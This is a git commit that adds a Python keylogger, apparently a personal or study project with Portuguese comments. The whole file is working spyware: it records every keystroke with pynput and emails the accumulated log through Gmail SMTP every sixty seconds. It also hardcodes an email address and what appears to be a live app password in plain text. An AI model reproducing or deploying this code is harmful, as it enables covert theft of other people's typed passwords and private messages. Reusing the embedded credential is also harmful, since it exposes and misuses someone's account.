c9225dbb18891000821e28feb204195a46027bc7
Wendel Emidio <44251520+WendelEmidio@users.noreply.github.com>
2025-11-30 19:43:28 -0300

    Add files via upload

---
+++ Keylogger/keylogger_email.py
@@ -0,0 +1,57 @@
+from pynput import keyboard
+import smtplib
+from email.mime.text import MIMEText
+from threading import Timer
+
+# configurações de e-mail
+EMAIL_ORIGEM = "wendelemidio@gmail.com"
+EMAIL_DESTINO = "wendelemidio@gmail.com"
+SENHA_EMAIL = "uieo vkgo yjgn etfu"
+
+log = ""
+
+
+def enviar_email():
+    global log
+    if log:
+        msg = MIMEText(log)
+        msg['SUBJECT'] = "Dados capturados pelo keylogger"
+        msg['From'] = EMAIL_ORIGEM
+        msg['To'] = EMAIL_DESTINO
+        
+        try:
+            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server.starttls()
+            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
+            server.send_message(msg)
+            server.quit()
+        except Exception as e:
+            print("Erro ao enviar", e)
+
+        log = ""
+
+    # Agendar o envio a cada 60s
+
+    Timer(60, enviar_email).start()
+
+
+def on_press(key):
+    global log
+    try:
+        log += key.char
+    except AttributeError:
+        if key == keyboard.Key.space:
+            log += " "
+        elif key == keyboard.Key.enter:
+            log += "\n"
+        elif key == keyboard.Key.backspace:
+            log += "[<]"
+        else:
+            pass  # Ignora control, shift, etc
+
+# Inicia o keylogger e o envio automático
+
+
+with keyboard.Listener(on_press=on_press) as listener:
+    enviar_email()
+    listener.join()
